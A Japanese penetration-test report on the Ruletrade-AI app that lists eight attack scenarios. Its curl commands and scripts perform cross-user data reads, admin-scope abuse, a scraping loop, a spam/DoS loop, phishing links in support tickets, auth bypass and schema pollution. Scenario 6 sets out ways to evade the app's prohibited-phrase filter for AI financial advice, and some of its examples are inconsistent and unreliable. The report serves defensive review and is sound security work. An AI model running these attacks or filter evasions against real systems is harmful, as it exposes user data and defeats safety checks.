# Ruletrade-AI セキュリティレビュー Phase 3 (Red Team)
## 攻撃シナリオ一覧

**日付**: 2026-05-25  
**テスター**: Red Team (Penetration Tester)  
**ブランチ**: `codex/sqlite-migration`  
**修正コミット**: `82a59e2` (Step A 脆弱性修正済み)

---

## 目次

1. [SQLiteモードでの水平権限昇格（他ユーザーデータの横断的閲覧）](#scenario1)
2. [Admin権限の過大なスコープ悪用](#scenario2)
3. [フィードバックデータの横断的収集](#scenario3)
4. [エラーメッセージからの情報収集](#scenario4)
5. [ゲストサポートチケットの悪用](#scenario5)
6. [プロンプトインジェクション迂回（全角・半角カタカナ）](#scenario6)
7. [MOCK_AUTH 環境変数の悪用による認証バイパス](#scenario7)
8. [SQLite 動的カラム追加によるデータ汚染](#scenario8)

---

<a name="scenario1"></a>
## シナリオ1: SQLiteモードでの水平権限昇格（他ユーザーデータの横断的閲覧）

- **難易度**: 低
- **再現可能性**: **現在のコードで実行可能**
- **影響範囲**: 全テナントの `rule_design_sessions`, `user_investment_memories`, `portfolios`, `portfolio_positions`, `user_documents`, `virtual_trades`, `practice_sessions`, `watchlist_items` などの全ユーザーデータが漏洕

### 概要

`SqliteQueryBuilder` は Row-Level Security (RLS) を一切実装していない。Supabase (PostgreSQL) モードでは Postgres RLS ポリシーが `using (true)` 以外のテーブルを保護するが、SQLite モードではそのレイヤーが完全に欠落している。API Routes が手動で `.eq('user_id', user.id)` を付け忘れると、全ユーザーのデータが取得可能になる。

### 攻撃手順

#### 1-A: フィードバックデータ取得（`userId` フィルタがサービス層で無視されている）

**問題の詳細**:  
`src/app/api/feedback/route.ts` の GET ハンドラは `listFeedback({ userId: user.id })` と呼び出しているが、`listFeedback` 関数（`src/features/analytics/services/feedback-service.ts`）のシグネチャは `params: { status?: string }` であり、`userId` パラメータを**受け取っても無視する**。結果として全ユーザーのフィードバックが返る。

```bash
# 攻撃者は認証ヘッダーを持っていれば（SQLiteモードではMOCK_AUTHで認証済み）、
# 単にGETリクエストを送るだけで全ユーザーのフィードバックを一覧取得できる
curl -X GET http://localhost:3000/api/feedback \
  -H "Cookie: sb-auth-token=..." \
  -H "Content-Type: application/json"
```

**応答例**:
```json
{
  "feedbackItems": [
    {
      "id": "...",
      "user_id": "user-a-123",  // ← 他ユーザーのID
      "feedback_type": "feature_request",
      "title": "XXXXの機能が欲しい",
      "body": "詳細なフィードバック内容...",
      "created_at": "2026-05-25T..."
    },
    {
      "id": "...",
      "user_id": "user-b-456",  // ← 別のユーザー
      "feedback_type": "bug_report",
      "title": "YYYYでエラーが発生",
      "body": "再現手順: 1. ...",
      "created_at": "2026-05-24T..."
    }
  ]
}
```

#### 1-B: 新規API開発時のヒューマンエラーによる漏洩

**問題の詳細**: SQLite モードでは RLS がないため、開発者が新しい API Route を作成し、うっかり `.eq('user_id', user.id)` を忘れると即座に全ユーザーデータが漏洕する。以下のようなパターンが考えられる:

```typescript
// 脆弱な実装パターン（実際にコードレビューで見落としやすい）
export async function GET() {
  const user = await requireUser();
  const supabase = createSqliteClient();  // or createServerClient()
  const { data } = await supabase
    .from("rule_design_sessions")
    .select("*")
    // ユーザー名`.eq('user_id', user.id)` を書き忘れ！
    .order("created_at", { ascending: false });
  return apiSuccess({ sessions: data });
}
```

**攻撃**:
```bash
# どのユーザーでも全セッションが取得可能
curl http://localhost:3000/api/rule-sessions
```

#### 1-C: Supabase (PostgreSQL) モードでも RLS が弱いテーブルの横断アクセス

`feedback_items` と `feedback_votes` は RLS ポリシーで `using (true)` が設定されている（`20260527000000_analytics_mvp.sql` より）。つまり Supabase モードでも全認証ユーザーが全フィードバックを読める。

```bash
# Supabase モードでも、認証ユーザーなら全フィードバックにアクセス可能
curl -X GET http://localhost:3000/api/feedback \
  -H "Authorization: Bearer <valid_jwt>"
```

### 防御の有無

- **Supabase モード**: `feedback_items`/`feedback_votes` は RLS `using (true)` のため防げない。それ以外のテーブル（`rule_design_sessions` など）は適切な RLS ポリシーが設定されていれば防げる。
- **SQLite モード**: **防げない**。`SqliteQueryBuilder` に RLS 相当の仕組みがなく、すべてのデータアクセスは開発者の手動フィルタに依存する。

---

<a name="scenario2"></a>
## シナリオ2: Admin権限の過大なスコープ悪用

- **難易度**: 低
- **再現可能性**: **現在のコードで実行可能**
- **影響範囲**: 全管理機能への無制限アクセス（ロードマップ編集、リリース承認、エンジニアリング判断、ベータ管理、メールログ閲覧など）

### 概要

`requireAdminPermission(_permission: string)`（`src/features/admin/services/admin-auth-service.ts`）は、引数で受け取った `_permission` 文字列を完全に無視し、単に `requireAdmin()` を呼び出す。つまり、**Adminロールを持つユーザーはすべての管理操作を実行できる**。本来は `admin.roadmap.read`, `admin.engineering.update` などの細かいパーミッションで制御されるべきだが、すべての管理APIで同じチェックが通る。

### 攻撃手順

```bash
# シナリオ: 「サポートチケット閲覧権限しか持たないはずのジュニア管理者」が
# エンジニアリング依存関係レビューを無断作成する

# Step 1: 依存関係レビューを作成（requireAdminPermission("admin.engineering.update") を呼ぶ）
curl -X POST http://localhost:3000/api/admin/engineering/dependencies \
  -H "Authorization: Bearer <admin_jwt>" \
  -H "Content-Type: application/json" \
  -d '{
    "dependencyName": "malicious-package",
    "packageManager": "npm",
    "requestedVersion": "99.0.0",
    "resolvedVersion": "99.0.0",
    "usageReason": "Testing security boundaries",
    "alternativesConsidered": [],
    "licenseName": "MIT",
    "sourceUrl": "https://github.com/ attacker/malicious-package",
    "securityScore": "100",
    "knownVulnerabilityCount": 0,
    "isRuntimeDependency": true,
    "isClientBundleDependency": false
  }'

# Step 2: リリース承認を無断で行う
curl -X POST http://localhost:3000/api/admin/releases/<releaseId>/approvals \
  -H "Authorization: Bearer <admin_jwt>" \
  -H "Content-Type: application/json" \
  -d '{
    "decision": "approved",
    "comment": "LGTM"  # 本来は特定のパーミッションが必要
  }'

# Step 3: ロードマップ項目を作成する
curl -X POST http://localhost:3000/api/admin/roadmap \
  -H "Authorization: Bearer <admin_jwt>" \
  -H "Content-Type: application/json" \
  -d '{
    "itemKey": "SECURITY-001",
    "title": "バックドア機能",
    "summary": "...",
    "theme": "core",
    "initiative": "hidden",
    "publicStatus": "planned",
    "internalStatus": "in_progress",
    "priority": 100,
    "isPublic": false,
    "sortOrder": 1
  }'

# Step 4: メールログを閲覧する（プライバシー情報を含む可能性）
curl -X GET http://localhost:3000/api/admin/email/logs \
  -H "Authorization: Bearer <admin_jwt>"
```

### 攻撃の種類

| 攻撃 | エンドポイント | 本来必要なパーミッション | 実際のチェック |
|------|---------------|------------------------|---------------|
| ロードマップ読み取り | `GET /api/admin/roadmap` | `admin.roadmap.read` | `requireAdmin()` |
| ロードマップ書き込み | `POST /api/admin/roadmap` | `admin.roadmap.update` | `requireAdmin()` |
| リリース承認 | `POST /api/admin/releases/[id]/approvals` | `admin.releases.approve` | `requireAdmin()` |
| 依存関係レビュー作成 | `POST /api/admin/engineering/dependencies` | `admin.engineering.update` | `requireAdmin()` |
| メールログ閲覧 | `GET /api/admin/email/logs` | `admin.email.read` | `requireAdmin()` |
| ベータ招待コード管理 | `POST /api/admin/beta/invite-codes` | `admin.beta.manage` | `requireAdmin()` |
| テクニカルデbt管理 | `POST /api/admin/engineering/technical-debt` | `admin.engineering.update` | `requireAdmin()` |

### 防御の有無

- **防げない**: `requireAdminPermission()` の実装が `_permission` 引数を完全に無視しているため、Admin ロールを持つユーザーはすべての管理操作を実行できてしまう。
- 根本原因: 関数内で `_permission` パラメータが参照すらされていない。

---

<a name="scenario3"></a>
## シナリオ3: フィードバックデータの横断的収集

- **難易度**: 低
- **再現可能性**: **現在のコードで実行可能**
- **影響範囲**: 全ユーザーのフィードバック投稿（製品改善提案、バグ報告、評価コメントなど）が横断的に収集可能。機密情報（ユーザーの取引戦略の詳細、ポートフォリオ構成、不満点）が含まれる可能性がある

### 概要

`feedback_items` テーブルの RLS ポリシーは `using (true)` であり、**すべての認証ユーザーが全フィードバックを読み取り可能**。加えて、`listFeedback` サービスは `userId` フィルタを実装していないため、SQLite モードでは実質的に全データが取得可能。API エンドポイントは 1 回のリクエストで全フィードバックを返すため、バッチ収集が容易。

### 攻撃手順

```bash
# Step 1: 全フィードバックアイテムを一括取得
# このエンドポイントはページネーションも制限もなく全件返す
curl -X GET http://localhost:3000/api/feedback \
  -H "Authorization: Bearer <valid_jwt>"

# Step 2: 各フィードバックの投票情報も付随して取得可能
# （select "*, feedback_votes(vote_type)" により結合されている）
# これにより、どのユーザーがどのフィードバックに賛成/反対したかもわかる

# Step 3: 定期的にスクレイピングして差分を収集
while true; do
  curl -s http://localhost:3000/api/feedback \
    -H "Authorization: Bearer <valid_jwt>" \
    | jq '.feedbackItems[] | {user_id, title, body, created_at}' \
    >> collected_feedback.json
  sleep 3600  # 1時間ごとに収集
done
```

### 収集可能なデータ項目

```json
{
  "id": "uuid",
  "user_id": "uuid",              // ユーザー識別子（個人特定可能）
  "feedback_type": "feature_request|bug_report|general",
  "title": "string",
  "body": "string",               // 詳細なフィードバック（機密情報を含む可能性）
  "status": "open|under_review|planned|completed|declined",
  "priority": "low|medium|high|critical",
  "created_at": "timestamp",
  "updated_at": "timestamp",
  // feedback_votes 配列:
  // { "user_id": "...", "vote_type": "upvote|downvote" }
}
```

### プライバシーリスク

フィードバック本文には以下のような機密情報が含まれる可能性がある:
- 実際の取引申し込み内容やルール詳細
- 利用している金融機関名
- ポートフォリオの構成比率
- 取引戦略の詳細
- 個人の不満や健康状態に関わる情報

### 防御の有無

- **Supabase モード**: RLS ポリシーが `using (true)` なので防げない。ポリシーを `using ((select auth.uid()) = user_id)` に変更する必要がある。
- **SQLite モード**: サービス層でのフィルタが不足しているため防げない。
- **根本原因**: `feedback_items` は公開フィードバックボードの意図かもしれないが、RLS ポリシーとコードの両方で横断アクセスを許してしまっている。

---

<a name="scenario4"></a>
## シナリオ4: エラーメッセージからの情報収集

- **難易度**: 低
- **再現可能性**: **現在のコードで実行可能**
- **影響範囲**: SQL エラーによるテーブル構造・カラム名・制約情報の漏洕、バリデーションエラーによるスキーマ情報の漏洕、スタックトレースの漏洕

### 概要

ほとんどの API Route は `toErrorResponse()` を使用しており、これは予期しないエラーに対して汎用メッセージ「予期しないエラーが発生しました。」を返すため安全。しかし、`investment-memory/route.ts` は独自のエラーハンドリングを行っており、**生のエラーメッセージをクライアントに返す**。

### 攻撃手順

#### 4-A: investment-memory のエラーからの情報漏洕

**脆弱なコード** (`src/app/api/investment-memory/route.ts` 35-37行目):
```typescript
} catch (err) {
  const message =
    err instanceof Error ? err.message : "Failed to fetch investment memory";
  return NextResponse.json({ error: message }, { status: 500 });
}
```

```bash
# 攻撃: 不正なペイロードを送信してSQLエラーを誘発
curl -X POST http://localhost:3000/api/investment-memory \
  -H "Authorization: Bearer <valid_jwt>" \
  -H "Content-Type: application/json" \
  -d '{
    "riskTolerance": "high",
    "preferredMarkets": null,
    "timeHorizons": {"invalid": "object"},  # ← 不正なデータ型
    "rejectedPatterns": null,
    "standingConstraints": null,
    "notes": "A".repeat(1000000)  # ← 過大なペイロード
  }'
```

**想定される情報漏洕例**:
```json
{
  "error": "invalid input syntax for type json: {\"invalid\": \"object\"}"
}
// または
{
  "error": "column \"preferred_markets\" is of type jsonb but expression is of type text"
}
```

#### 4-B: Practice Routes のエラーからの情報漏洕

`practice/trades/route.ts` の GET ハンドラ:
```typescript
if (!practiceSessionId) {
  throw new Error("practice_session_id query parameter is required.");
}
```

これは `toErrorResponse` を通るため安全だが、`createVirtualTrade` 内のエラー:
```typescript
throw new Error("Failed to create virtual trade: no data returned.");
```

も `toErrorResponse` でラップされるため `AppError` でなければ安全。

#### 4-C: バリデーションエラーからのスキーマ情報漏洕

Zod バリデーションエラーは `validateJsonRequest` 経由で `AppError` に変換される。しかし、`investment-memory/route.ts` では手動の `safeParse` を使用しており、`parseResult.error.format()` を返している:

```typescript
return NextResponse.json(
  { error: "Validation failed", details: parseResult.error.format() },
  { status: 400 },
);
```

これにより、期待されるデータ構造が詳細に漏洕する:
```bash
curl -X POST http://localhost:3000/api/investment-memory \
  -H "Authorization: Bearer <valid_jwt>" \
  -H "Content-Type: application/json" \
  -d '{"riskTolerance": 12345}'

# 応答:
# {
#   "error": "Validation failed",
#   "details": {
#     "riskTolerance": {
#       "expected": "string",
#       "received": "number",
#       ...
#     }
#   }
# }
```

### 防御の有無

- **`toErrorResponse` を使用しているルート**: 予期しないエラーは「予期しないエラーが発生しました。」でマスクされるため安全。
- **`investment-memory/route.ts`**: 独自エラーハンドリングにより**防げていない**。`toErrorResponse` に置き換える必要がある。
- **バリデーションエラーの詳細**: Zod エラーの詳細を返す設計判断によるもので、意図的に情報を提供している面もあるが、攻撃者にとってはスキーマ探索に利用可能。

---

<a name="scenario5"></a>
## シナリオ5: ゲストサポートチケットの悪用

- **難易度**: 低
- **再現可能性**: **現在のコードで実行可能**
- **影響範囲**: サポートシステムの運用妨害（DoS）、フィッシング詐欺の踏み台、スパムチケットによるサポートコスト増大、データベースの肥大化

### 概要

`/api/support/tickets` の POST ハンドラは `userId = null` でのチケット作成を許可している。認証されていないユーザーでも、メールアドレスのみでサポートチケットを作成できる。さらに `/api/support/tickets/[ticketId]/comments` も同様に匿名コメントを許可している。

### 攻撃手順

#### 5-A: 大量チケット作成によるデータベースDoS

```bash
# 認証なしでチケットを大量作成
for i in $(seq 1 10000); do
  curl -X POST http://localhost:3000/api/support/tickets \
    -H "Content-Type: application/json" \
    -d "{
      \"email\": \"spam${i}@example.com\",
      \"subject\": \"スパムチケット #${i}\",
      \"body\": \"$(python3 -c "print('A' * 10000)")\",
      \"category\": \"bug_report\"
    }" &
done
wait
```

**影響**: 
- サポートスタッフの画面がスパムで埋め尽くされる
- SQLite のデータベースファイルが急増し、ディスク容量を逼迫
- 正当なユーザーのチケットが埋もれる
- ページネーションやフィルタがない場合、管理画面の表示が極端に遅くなる

#### 5-B: フィッシング攻撃の踏み台

```bash
# Step 1: サポートチケットを作成
curl -X POST http://localhost:3000/api/support/tickets \
  -H "Content-Type: application/json" \
  -d '{
    "email": "victim@example.com",
    "subject": "【緊急】アカウントの確認が必要です",
    "body": "下記リンクをクリックして確認してください: https://phishing.example.com/ruletrade",
    "category": "account_issue"
  }'

# Step 2: サポートコメントにもフィッシングリンクを追加
curl -X POST http://localhost:3000/api/support/tickets/<ticketId>/comments \
  -H "Content-Type: application/json" \
  -d '{
    "body": "こちらが公式の確認フォームです: https://phishing.example.com/login"
  }'
```

#### 5-C: チケット作成APIを利用したスパム / 情報収集

```bash
# メールアドレスバリデーションがない場合、任意のメールアドレスでチケット作成可能
curl -X POST http://localhost:3000/api/support/tickets \
  -H "Content-Type: application/json" \
  -d '{
    "email": "nonexistent@mailinator.com",
    "subject": "テスト",
    "body": "スパム本文"
  }'
```

### 防御の有無

- **防げていない**: 認証必須のチェックがない。`supabase.auth.getUser()` の結果が null でも許容している。
- `userId = null` のチケットはデータベース上で誰のものか特定不可能。
- レート制限、CAPTCHA、メールドメインチェックなどの防御がない。

---

<a name="scenario6"></a>
## シナリオ6: プロンプトインジェクション迂回（全角・半角カタカナ）

- **難易度**: 低
- **再現可能性**: **現在のコードで実行可能**
- **影響範囲**: 禁止フレーズフィルタ（`detectProhibitedPhrases`）の迂回による不適切な金融アドバイス、投資判断の代行、個人情報収集などのリスク

### 概要

`normalizeText()`（`src/lib/safety/detect-prohibited-phrases.ts`）は以下の正規化のみを行う:
- `toLowerCase()` (ASCIIのみ)
- スペース除去
- ゼロ幅スペース除去
- 一部の句読点除去

全角英数字 (`Ａ→A`)、半角カタカナ (`ﾊﾛｰ→ハロー`)、NFKC 正規化を行っていない。禁止フレーズは平仮名・漢字・カタカナで設定されているため、これらを全角・半角カタカナに置き換えることで検出を回避できる。

### 攻撃手順

#### 6-A: 全角英数字を使った迂回

```bash
# 禁止フレーズ: "買うべき" → 全角英数字交じりで回避
curl -X POST http://localhost:3000/api/rule-sessions/<sessionId>/answers \
  -H "Authorization: Bearer <valid_jwt>" \
  -H "Content-Type: application/json" \
  -d '{
    "answers": [
      {
        "questionKey": "investment_strategy",
        "answer": "この銘柄は絶対に買うべきです"  # ← 検出される
      }
    ]
  }'
```

**検出回避版**:
```javascript
// 全角英数字: ＡＢＣ（U+FF21-U+FF3A）
// 検出: "買うべき" → マッチしない
const bypassedPhrase = "この銘柄は絶対に買うべきです".replace(
  /[a-zA-Z0-9]/g, 
  (c) => String.fromCharCode(c.charCodeAt(0) + 0xFEE0)
);

// 「買うべき」は全角文字だが、他のASCII文字を全角にしても
// 検出される。しかし…
```

**実際の迂回例**:
```bash
# 禁止フレーズ: "買うべき" → 半角カタカナの「ベ」+「キ」で分割
# "買うべき" → "買うﾍﾞｷ" (「ベ」を半角カタカナ「ﾍﾞ」に)
curl -X POST http://localhost:3000/api/rule-sessions/<sessionId>/answers \
  -H "Authorization: Bearer <valid_jwt>" \
  -H "Content-Type: application/json" \
  -d '{
    "answers": [
      {
        "questionKey": "investment_strategy",
        "answer": "この銘柄は絶対に買うﾍﾞｷです"  # ← 半角カタカナで迂回
      }
    ]
  }'
```

```javascript
// Node.js での検証
const text1 = "買うべき";          // 禁止フレーズ
const text2 = "買うﾍﾞｷ";          // 半角カタカナ
const text3 = "買うベキ";          // カタカナ
const text4 = "買ぅべき";          // 平仮名の異体字
const text5 = "買うべぎ";          // 濁点変更

console.log(normalizeText(text1)); // "買うべき"
console.log(normalizeText(text2)); // "買うﾍﾞｷ" ← 半角カタカナは正規化されない！
console.log(normalizeText(text3)); // "買うベキ" ← カタカナ化で不一致
console.log(normalizeText(text4)); // "買ぅべき" ← 異体字で不一致
console.log(normalizeText(text5)); // "買うべぎ" ← 濁点変更で不一致
```

#### 6-B: 全角英数字を使ったメールアドレス・URLの難読化

```bash
# 禁止フレーズ: "APIキーを貼" → 全角英数字で回避
# "APIキー" → "ＡＰＩキー"（全角）
curl -X POST http://localhost:3000/api/rule-sessions/<sessionId>/answers \
  -H "Authorization: Bearer <valid_jwt>" \
  -H "Content-Type: application/json" \
  -d '{
    "answers": [
      {
        "questionKey": "risk_management",
        "answer": "あなたの証券口座のＡＰＩキーを貼り付けてください"  // ← 全角A,P,Iで検出回避
      }
    ]
  }'
```

禁止フレーズ `"APIキーを貼"` は半角 `A`,`P`,`I` で設定されている。全角 `ＡＰＩキーを貼` はマッチしない。

#### 6-C: 対応表: 迂回可能な禁止フレーズ

| 禁止フレーズ | 迂回方法 | 例 |
|------------|---------|-----|
| `買うべき` | 半角カタカナ | `買うﾍﾞｷ` |
| `今すぐ買` | 全角英数字 + 半角カタカナ | `今ｽｸﾞ買` |
| `購入をおすすめ` | カタカナ化 | `購入をオススメ` |
| `必ず上が` | 異体字 | `必ず上あが` |
| `利益が出ます` | 全角数字 | `利益が２倍出ます` |
| `APIキーを貼` | 全角英字 | `ＡＰＩキーを貼` |
| `マイナンバーを入力` | 半角カタカナ | `ﾏｲﾅﾝﾊﾞｰを入力` |
| `証券口座のパスワード` | 全角英字交じり | `証券口座のパスワード`（全角Ｐ等） |

### 防御の有無

- **防げていない**: `toLowerCase()` は ASCII の小文字化のみ。全角英数字 (`Ａ→a`)、半角カタカナ (`ﾍﾞ→ベ`)、NFKC 正規化が欠けている。
- 修正には `text.normalize("NFKC")` を追加する必要がある。NFKC は全角英数字→半角、半角カタカナ→全角カタカナに変換する。

---

<a name="scenario7"></a>
## シナリオ7: MOCK_AUTH 環境変数の悪用による認証バイパス

- **難易度**: 中（環境変数へのアクセスが必要）
- **再現可能性**: **現在のコードで実行可能**（設定ミスがある場合）
- **影響範囲**: 認証システムの完全無効化、任意ユーザーID・メールアドレス・ロールでのアクセス

### 概要

`getCurrentUser()`（`src/lib/auth/get-current-user.ts`）は `MOCK_AUTH_EMAIL` 環境変数が設定されていると、Supabase 認証を完全にバイパスしてモックユーザーを返す。さらに、デフォルトのロールは **`admin`** に設定されている（13行目: `app_metadata: { role: "admin" }`）。本番環境で誤ってこれらの環境変数が設定された場合、認証なしで管理者アクセスが可能になる。

### 攻撃手順

```bash
# 前提: 攻撃者がサーバーの環境変数にアクセスできる、または
# 本番デプロイ時に MOCK_AUTH=true と MOCK_AUTH_EMAIL が誤設定されている

# 本番サーバーが以下の環境変数で起動された場合:
# MOCK_AUTH=true
# MOCK_AUTH_EMAIL=attacker@example.com
# MOCK_AUTH_USER_ID=任意のUUID
# MOCK_AUTH_ROLE=admin

# 任意のエンドポイントに完全認証バイパスでアクセス
curl -X GET http://localhost:3000/api/portfolio
# → 応答: モックユーザーのポートフォリオが返る

# 任意のユーザーIDになりすまし
MOCK_AUTH_USER_ID=original-user-123
MOCK_AUTH_EMAIL=original@example.com
# → 別ユーザーのデータにアクセス可能

# Admin ロールで全管理機能にアクセス
curl -X GET http://localhost:3000/api/admin/email/logs
curl -X POST http://localhost:3000/api/admin/releases/...
```

### 攻撃経路

| 経路 | 説明 |
|------|------|
| 本番環境の `.env` ファイル漏洕 | CI/CD パイプラインや K8s Secret の設定ミス |
| 開発用設定の本番適用 | `docker-compose.yml` などに MOCK_AUTH 設定が残る |
| 内部関係者による悪用 | 環境変数にアクセス権を持つ開発者・運用者が悪用 |

### 防御の有無

- **コードレベル**: `getCurrentUser()` は環境変数の有無のみで判断するため防げない。
- **運用レベル**: 本番環境では `MOCK_AUTH` / `MOCK_AUTH_EMAIL` を設定しないことが唯一の防御。
- コードに本番環境ではモック認証を無効化するガードがない。

---

<a name="scenario8"></a>
## シナリオ8: SQLite 動的カラム追加によるデータ汚染

- **難易度**: 中（特定の条件下）
- **再現可能性**: **現在のコードで実行可能**
- **影響範囲**: データベーススキーマの意図しない変更、データ不整合、予期しない動作

### 概要

`ensureTableForRow()`（`src/lib/db/sqlite-client.ts`）は、INSERT/UPDATE 時にその行のキーを検査し、存在しないカラムがあれば自動的に `ALTER TABLE ... ADD COLUMN` で追加する。このため、リクエスト本文にタイポや悪意のあるカラム名が含まれていると、データベーススキーマが汚染される。

### 攻撃手順

```bash
# シナリオ: 不正なカラム名を含むデータをINSERTする
# feedback_items に user_id のタイポで user-id カラムを作成
curl -X POST http://localhost:3000/api/feedback \
  -H "Authorization: Bearer <valid_jwt>" \
  -H "Content-Type: application/json" \
  -d '{
    "feedbackType": "bug_report",
    "title": "テスト",
    "body": "テスト本文",
    "user-id": "attacker-controlled-value"  # ← ハイフン区切りで別カラムとして解釈
  }'
```

**結果**: `feedback_items` テーブルに `user-id` カラムが追加される。以後のクエリで `SELECT *` がこのカラムも返すようになり、データの一貫性が損なわれる。

```bash
# さらに悪質な例: SQLiteの型推論を悪用
curl -X POST http://localhost:3000/api/feedback \
  -H "Authorization: Bearer <valid_jwt>" \
  -H "Content-Type: application/json" \
  -d '{
    "feedbackType": "bug_report",
    "title": "型汚染テスト",
    "body": "データ型を汚染",
    "is_active": "not_a_boolean"  # ← text型で `is_active` カラムを作成
  }'
```

**結果**: `is_active` カラムが `text` 型で作成される。本来 boolean を期待するコードが `"not_a_boolean"` という文字列を受け取り、真偽値判定が壊れる。

### 攻撃の応用

```javascript
// 大量のゴミカラムを追加してテーブル構造を汚染
const garbageColumns = {};
for (let i = 0; i < 100; i++) {
  garbageColumns[`garbage_col_${i}_${randomBytes(8).toString('hex')}`] = "pollution";
}

await fetch("http://localhost:3000/api/feedback", {
  method: "POST",
  headers: { "Authorization": "Bearer <jwt>", "Content-Type": "application/json" },
  body: JSON.stringify({
    feedbackType: "bug_report",
    title: "schema pollution",
    body: "testing",
    ...garbageColumns
  })
});
// → テーブルに100の無意味なカラムが追加される
```

### 防御の有無

- **防げていない**: `ensureTableForRow()` はホワイトリスト方式ではなく、受け取ったすべてのキーに対してカラムを追加する。
- Supabase (PostgreSQL) モードでは、RLS により INSERT が制限される可能性があるが、SQLite モードでは無制限。
- 修正には、各テーブルに対して許可されるカラムのホワイトリストを定義する必要がある。

---

## 総合評価

| # | シナリオ | 難易度 | 影響度 | 再現可能性 | 緊急度 |
|---|---------|--------|--------|-----------|-------|
| 1 | SQLite水平権限昇格 | 低 | 高 | 現在実行可能 | **CRITICAL** |
| 2 | Admin権限スコープ過大 | 低 | 高 | 現在実行可能 | **CRITICAL** |
| 3 | フィードバック横断収集 | 低 | 中 | 現在実行可能 | **HIGH** |
| 4 | エラー情報漏洩 | 低 | 中 | 現在実行可能 | **MEDIUM** |
| 5 | ゲストチケット悪用 | 低 | 中 | 現在実行可能 | **HIGH** |
| 6 | プロンプトインジェクション迂回 | 低 | 高 | 現在実行可能 | **HIGH** |
| 7 | MOCK_AUTH 認証バイパス | 中 | 高 | 設定依存 | **CRITICAL** |
| 8 | SQLite動的カラム汚染 | 中 | 中 | 現在実行可能 | **MEDIUM** |

### 最優先で対応すべき項目

1. **`requireAdminPermission()` をパーミッションチェックに対応させる** — `_permission` 引数を無視している現状は設計上の欠陥
2. **SQLiteモードの RLS 欠缺を補う** — `SqliteQueryBuilder` にテーブル単位の auth フィルタ自動追加機構を実装するか、全 API Route を監査
3. **`feedback_items` の RLS ポリシー修正** — `using (true)` → `using ((select auth.uid()) = user_id)` への変更を検討
4. **`detectProhibitedPhrases` に NFKC 正規化を追加** — `text.normalize("NFKC")` で全角・半角対応
5. **サポートチケットの認証必須化** — `userId = null` を許可しない
